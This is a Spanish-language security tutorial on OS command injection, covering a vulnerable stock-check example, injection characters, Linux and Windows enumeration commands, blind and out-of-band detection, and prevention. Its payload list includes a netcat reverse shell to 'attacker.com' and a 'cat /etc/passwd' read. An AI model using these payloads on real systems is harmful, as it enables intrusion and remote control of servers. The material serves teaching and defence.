## 🚧 OS Command Injection

---

# 🔐 ¿Qué es OS Command Injection?

**OS Command Injection** (tambien conocido como **Shell Injection**) es una vulnerabilidad que ocurre cuando una aplicación web permite que un atacante inyecte y ejecute **comandos arbitrarios del sistema operativo** en el servidor.

Cuando esto ocurre, el atacante puede:

- Ejecutar comandos con los mismos privilegios que el proceso vulnerable (por ejemplo, el usuario del servidor web).
- Acceder a archivos sensibles, credenciales, servicios de red internos.
- En muchos casos, escalar privilegios o pivotear hacia otros sistemas internos.

> 🚀 Es una de las vulnerabilidades **más críticas** que puede sufrir una aplicación web.

---

# 🔹 Ejemplo de funcionamiento vulnerable

### Contexto:

Una tienda online permite consultar el stock de un producto en una sucursal específica mediante la siguiente URL:

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

En el backend, el sistema ejecuta el siguiente comando en una terminal para consultar el stock en sistemas legados:

```bash
stockreport.pl 381 29
```

El problema aparece cuando los valores de `productID` y `storeID` son inyectados directamente en el comando del sistema **sin ninguna validación o sanitización**.

---

# 🚨 Explotación básica

El atacante puede enviar lo siguiente como valor de `productID`:

```
& echo aiwefwlguh &
```

El comando resultante que se ejecuta es:

```bash
stockreport.pl & echo aiwefwlguh & 29
```

Lo que ejecuta:
1. `stockreport.pl` (sin argumentos, produce un error).
2. `echo aiwefwlguh` (el string aparece en la salida).
3. `29` (interpreta `29` como un comando, produce un error).

### Resultado en pantalla:
```
Error - productID was not provided
aioefwguh
29: command not found
```

### 🔗 Caracteres de inyección comunes en Linux:

| Carácter | Funcón |
|----------|--------|
| `&` | Ejecuta comandos en secuencia. |
| `;` | Separa comandos independientes. |
| `\|` | Pipe: conecta la salida de un comando con otro. |
| `||`, `&&` | Condicionales: ejecuta solo si el anterior falla/exitoso. |
| `\`` o `$()` | Ejecuta comandos en subshell. |

### 🔗 Ejemplo de payloads:

```bash
productID=381; whoami
productID=381 && ls /
productID=381 | nc attacker.com 4444 -e /bin/bash
productID=381$(id)
```

---

# 🔢 Variantes por sistema operativo

### 🌎 Linux:

| Comando | Descripción |
|---------|-------------|
| `id` | Muestra el usuario actual. |
| `uname -a` | Info del kernel y sistema. |
| `cat /etc/passwd` | Usuarios del sistema. |
| `netstat -tuln` | Puertos abiertos. |

### 🌊 Windows:

| Comando | Descripción |
|---------|-------------|
| `whoami` | Usuario actual. |
| `dir` | Lista archivos del directorio. |
| `ipconfig` | Info de red. |
| `type C:\\Windows\\win.ini` | Leer archivo clásico para prueba. |

> ⚠️ En Windows, los comandos se pueden inyectar con `&`, `&&`, `|`, `^`.

---

# 🔒 Técnicas para detectar OS Command Injection

1. **Inyección de comandos de eco:**
   ```bash
   & echo testcmd &
   ```
   Si "testcmd" aparece en la respuesta, hay ejecución.

2. **Retraso por tiempo (blind):**
   ```bash
   ; sleep 10
   ```
   Si la respuesta demora, el comando fue ejecutado aunque no haya salida visible.

3. **Out-of-Band (OAST):**
   ```bash
   ; curl http://your-burpcollaborator.net
   ```
   Se usa para detectar ejecución si no hay respuesta directa (blind RCE).

---

# 🚫 Cómo prevenir OS Command Injection

### ✅ 1. Evitar construir comandos con datos del usuario
- Usar APIs del lenguaje que **no invocan shell** (por ejemplo, `subprocess.run()` en Python con `shell=False`).

### ✅ 2. Validar estrictamente la entrada
- Usar **listas blancas** (whitelisting) para los argumentos esperados.
- Rechazar cualquier caracter especial como `;`, `&`, `|`, `>`.

### ✅ 3. Uso de privilegios mínimos
- El proceso que ejecuta el comando debe correr como un usuario **con permisos limitados**.

### ✅ 4. Escape adecuado de argumentos
- Si realmente se deben usar en comandos, escapar correctamente según el sistema operativo.

---

# 🎓 Conclusión

**OS Command Injection** es una de las vulnerabilidades más críticas debido a su capacidad de proporcionar al atacante **acceso directo al sistema operativo** del servidor. Con pocos caracteres, un atacante puede escalar desde un acceso limitado hasta tomar control completo del entorno.

La prevención se basa en:
- **No confiar nunca en la entrada del usuario**.
- Evitar ejecutar comandos innecesariamente.
- Implementar validaciones estrictas y usar métodos seguros para ejecutar procesos si es inevitable.

> ⚠️ Como pentester, la detección de OS command injection puede ser sutil, pero los resultados son devastadores cuando se explota correctamente.

